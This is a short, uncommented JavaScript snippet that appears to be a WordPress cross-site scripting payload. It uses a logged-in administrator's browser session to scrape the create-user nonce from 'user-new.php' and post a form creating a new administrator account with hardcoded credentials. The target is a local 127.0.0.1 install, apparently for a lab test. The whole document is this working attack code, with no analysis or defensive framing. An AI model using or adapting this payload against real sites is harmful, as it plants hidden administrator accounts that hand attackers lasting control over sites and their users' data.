async function getCreateUserNonce() {
  const pageRes = await fetch("http://127.0.0.1/wordpress/wp-admin/user-new.php", {
    credentials: "include"
  });
  const html = await pageRes.text();
  const match = html.match(/name="_wpnonce_create-user"\s+value="([^"]+)"/);
  return match ? match[1] : null;
}

async function createAdminUser(username, email, password) {
  const nonce = await getCreateUserNonce();
  if (!nonce) { console.error("Could not extract nonce"); return; }

  console.log("Got nonce:", nonce);

  const res = await fetch("http://127.0.0.1/wordpress/wp-admin/user-new.php", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Referer": "http://127.0.0.1/wordpress/wp-admin/user-new.php"
    },
    body: new URLSearchParams({
      action: "createuser",
      "_wpnonce_create-user": nonce,
      "_wp_http_referer": "/wordpress/wp-admin/user-new.php",
      user_login: username,
      email: email,
      first_name: "",
      last_name: "",
      url: "",
      pass1: password,
      pass2: password,
      send_user_notification: "1",
      role: "administrator",
      createuser: "Add User"
    }).toString()
  });

  if (res.url.includes("update=add") || res.redirected) {
    console.log("User created successfully!");
  } else {
    const html = await res.text();
    const error = html.match(/<div[^>]+class="[^"]*error[^"]*"[^>]*>([\s\S]*?)<\/div>/);
    if (error) console.error("Error:", error[1].replace(/<[^>]+>/g, '').trim());
    else console.log("Response URL:", res.url);
  }
}

createAdminUser("newadmin", "newadmin@example.com", "StrongPass123!");
